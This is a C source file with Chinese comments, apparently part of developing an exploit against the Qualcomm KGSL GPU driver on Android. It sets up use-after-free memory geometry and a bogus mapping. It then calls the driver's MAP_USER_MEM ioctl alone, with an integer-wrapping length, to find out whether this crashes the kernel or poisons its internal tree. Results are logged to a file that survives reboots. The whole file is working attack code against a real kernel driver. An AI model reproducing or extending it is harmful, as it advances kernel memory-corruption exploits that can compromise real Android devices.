/*
 * k3_poison_test.c — 定位崩溃点：单独执行 racer 的 MAP_USER_MEM（不做竞速）
 *
 * 目的：区分三种可能
 *   H1  该 ioctl 自身立即致命            → 日志停在 "racer: 进入"，无返回行
 *   H2  该 ioctl 返回 ENOMEM 并毒化 rbtree，
 *       后续任何 set_svm_region 触发崩溃   → 日志停在 "probe-after: 进入"
 *   H3  毒化无害，崩溃在进程退出/pagetable 销毁 → 日志能打完 "about to exit"
 *
 * 每步 write(2)+fsync 落到 /data/local/tmp/poison.log（重启后仍可读）。
 * 不含竞速、不含 GPU 命令。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define PAGE 4096
#define LOGPATH "/data/local/tmp/poison.log"

struct kgsl_map_user_mem {
	int fd;
	unsigned long gpuaddr;
	uint64_t len;
	uint64_t offset;
	unsigned long hostptr;
	int memtype;
	unsigned int flags;
};

struct kgsl_gpuobj_alloc {
	uint64_t size;
	uint64_t flags;
	uint64_t va_len;
	uint64_t mmapsize;
	unsigned int id;
	unsigned int metadata_len;
	uint64_t metadata;
};

#define IOCTL_KGSL_MAP_USER_MEM \
	_IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPUOBJ_ALLOC \
	_IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR   0x00000002

#define UAF_START     0x00000007001ff000ULL
#define UAF_SIZE      0x0000000010004000ULL
#define BOGUS_START   0x0000000700204000ULL
#define WRAP_SIZE     0xffffffffffefd000ULL
#define CTRL_ADDR     0x00000007f0000000ULL  /* 干净区间，位于 UAF 区间之上 */
#define AFTER_ADDR    0x00000007e0000000ULL  /* 毒化后探测 */

static int fd = -1;
static int logfd = -1;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[300];
	char line[360];
	va_list ap;
	int n;
	double t = now_ms();

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%9.3f] %s\n", t, buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0) {
		if (write(logfd, line, n) < 0) { }
		fsync(logfd);
	}
}

static void on_alarm(int s)
{
	(void)s;
	lg("WATCHDOG: 45s 超时（阻塞在 ioctl？）");
	_exit(9);
}

/* 在 addr 建一个页 VMA 并注册为 SVM 区（干净探测） */
static int svm_probe(uint64_t addr, const char *tag)
{
	struct kgsl_map_user_mem m;
	void *p;
	int ret, e;

	p = mmap((void *)(uintptr_t)addr, PAGE, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (p == MAP_FAILED) {
		lg("%s: vma FAIL errno=%d (%s)", tag, errno, strerror(errno));
		return -1;
	}
	*(volatile char *)p = 1;
	memset(&m, 0, sizeof(m));
	m.fd = -1;
	m.len = PAGE;
	m.hostptr = (unsigned long)(uintptr_t)p;
	m.memtype = KGSL_USER_MEM_TYPE_ADDR;
	m.flags = KGSL_MEMFLAGS_USE_CPU_MAP;

	lg("%s: 进入 MAP_USER_MEM(0x%llx)", tag, (unsigned long long)addr);
	errno = 0;
	ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &m);
	e = errno;
	lg("%s: 返回 ret=%d errno=%d (%s) gpuaddr=0x%lx", tag, ret, e,
	   strerror(e), m.gpuaddr);
	munmap(p, PAGE);
	return ret;
}

int main(void)
{
	unsigned int uaf_id = 0;
	uint64_t uaf_ms = 0;
	void *p, *bogus;
	size_t k;
	struct kgsl_map_user_mem m;
	int ret, e;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== poison_test start pid=%d =====", getpid());
	signal(SIGALRM, on_alarm);
	alarm(45);

	fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
	if (fd < 0) {
		lg("open FAIL errno=%d (%s)", errno, strerror(errno));
		return 1;
	}
	lg("open OK fd=%d", fd);

	/* 对照组：毒化之前，干净区间应可注册 */
	svm_probe(CTRL_ADDR, "control-before");

	/* UAF 几何 */
	memset(&m, 0, sizeof(m));
	{
		struct kgsl_gpuobj_alloc al;
		memset(&al, 0, sizeof(al));
		al.size = UAF_SIZE;
		al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
		errno = 0;
		if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al)) {
			lg("UAF alloc FAIL errno=%d", errno);
			return 1;
		}
		uaf_id = al.id;
		uaf_ms = al.mmapsize;
		lg("UAF alloc OK id=%u mmapsize=0x%llx", uaf_id,
		   (unsigned long long)uaf_ms);
	}
	p = mmap((void *)(uintptr_t)UAF_START, (size_t)uaf_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		 (off_t)uaf_id << 12);
	if (p == MAP_FAILED) {
		lg("UAF mmap FAIL errno=%d", errno);
		return 1;
	}
	((volatile char *)p)[0] = 1;
	((volatile char *)p)[uaf_ms - PAGE] = 1;
	for (k = 0; k + PAGE < uaf_ms; k += PAGE * 1024)
		((volatile char *)p)[k] = 1;
	lg("UAF mmap+touch OK");
	munmap(p, (size_t)uaf_ms);
	lg("UAF munmap OK");

	bogus = mmap((void *)(uintptr_t)BOGUS_START, PAGE * 3,
		     PROT_READ | PROT_WRITE,
		     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (bogus == MAP_FAILED) {
		lg("BOGUS mmap FAIL errno=%d", errno);
		return 1;
	}
	for (k = 0; k < 3; k++)
		((volatile char *)bogus)[k * PAGE] = 1;
	lg("BOGUS VMA OK");

	/* —— 关键：单独执行 racer 的 ioctl —— */
	memset(&m, 0, sizeof(m));
	m.fd = -1;
	m.len = WRAP_SIZE;
	m.offset = 0;
	m.hostptr = BOGUS_START;
	m.memtype = KGSL_USER_MEM_TYPE_ADDR;
	m.flags = KGSL_MEMFLAGS_USE_CPU_MAP;

	lg("racer: 进入 MAP_USER_MEM(hostptr=0x%llx, len=0x%llx)",
	   (unsigned long long)BOGUS_START, (unsigned long long)WRAP_SIZE);
	errno = 0;
	ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &m);
	e = errno;
	lg("racer: 返回 ret=%d errno=%d (%s)", ret, e, strerror(e));

	/* 毒化后探测：这棵树是否还能行走 */
	svm_probe(AFTER_ADDR, "probe-after");

	lg("about to exit（若此后设备离线，则崩溃在退出/pagetable 销毁）");
	lg("===== end =====");
	close(fd);
	_exit(0);
}
